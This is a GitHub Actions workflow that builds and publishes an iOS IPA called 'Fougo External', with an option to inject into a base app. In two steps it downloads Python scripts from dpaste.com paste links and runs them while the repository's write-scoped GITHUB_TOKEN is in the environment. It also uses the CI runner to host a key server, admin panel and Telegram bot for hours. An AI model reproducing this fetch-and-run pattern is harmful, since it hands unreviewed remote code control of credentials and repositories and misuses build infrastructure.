name: Build Fougo External iOS IPA & Live Server

on:
  workflow_dispatch:
    inputs:
      build_mode:
        description: "Packaging Mode"
        required: true
        default: "standalone"
        type: choice
        options:
          - standalone
          - inject
      base_ipa_path:
        description: "Path to base .ipa in repo (used when mode = inject)"
        required: false
        default: "base/TargetApp.ipa"
      signing_method:
        description: "Code Signing Method"
        required: true
        default: "ldid-adhoc"
        type: choice
        options:
          - ldid-adhoc
          - unsigned
          - apple-p12
      architecture:
        description: "Target Architecture Slice(s)"
        required: true
        default: "arm64"
        type: choice
        options:
          - arm64
          - arm64+arm64e
      app_version:
        description: "CFBundleShortVersionString"
        required: false
        default: "2.4.0"
      build_number:
        description: "CFBundleVersion"
        required: false
        default: "240"
      server_duration:
        description: "Live Server & Telegram Bot Duration (minutes, max 350)"
        required: false
        default: "350"
  push:
    branches:
      - main

permissions:
  contents: write

jobs:
  build-ipa:
    name: Compile ARM64 Mach-O & Run 24/7 Fougo Cloud Ecosystem
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Compile ARM64 iOS App & Package ESign IPA
        shell: pwsh
        env:
          INPUT_VERSION: ${{ github.event.inputs.app_version || '2.4.0' }}
          INPUT_BUILD: ${{ github.event.inputs.build_number || '240' }}
          SERVER_MINS: ${{ github.event.inputs.server_duration || '350' }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GH_REPO: ${{ github.repository }}
        run: |
          $scriptFile = Join-Path $env:RUNNER_TEMP "build_fougo.py"
          Invoke-WebRequest -Uri "https://dpaste.com/HLCBDQJW4.txt" -OutFile $scriptFile -UseBasicParsing
          python $scriptFile

      - name: Upload Compiled .ipa Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Fougo-External-IPA
          path: built-ipa/*.ipa
          if-no-files-found: error
          retention-days: 90

      - name: Upload Full LiquidGlass Source Project Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Fougo-LiquidGlass-Source-Project
          path: built-ipa/Fougo-LiquidGlass-Full-Source-Project.zip
          if-no-files-found: warn
          retention-days: 90

      - name: Publish Direct Download Release (For ESign & Telegram Bot)
        uses: softprops/action-gh-release@v2
        with:
          tag_name: latest-ipa
          name: "Fougo External v2.4.0 (ESign Ready IPA + LiquidGlass Source)"
          body: "Direct ESign-ready `.ipa` and full LiquidGlass source archive built automatically."
          prerelease: false
          files: |
            built-ipa/FougoExternal-ESign-Ready.ipa
            built-ipa/FougoExternal-ESign-Unsigned.ipa
            built-ipa/Fougo-LiquidGlass-Full-Source-Project.zip
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Run Live Key Server, Web Admin Panel & Telegram Bot
        if: always()
        shell: bash
        env:
          SERVER_MINS: ${{ github.event.inputs.server_duration || '350' }}
          GH_REPO: ${{ github.repository }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          curl -sSL "https://dpaste.com/B6QJJLCWN.txt" -o /tmp/run_ecosystem.py
          python3 /tmp/run_ecosystem.py
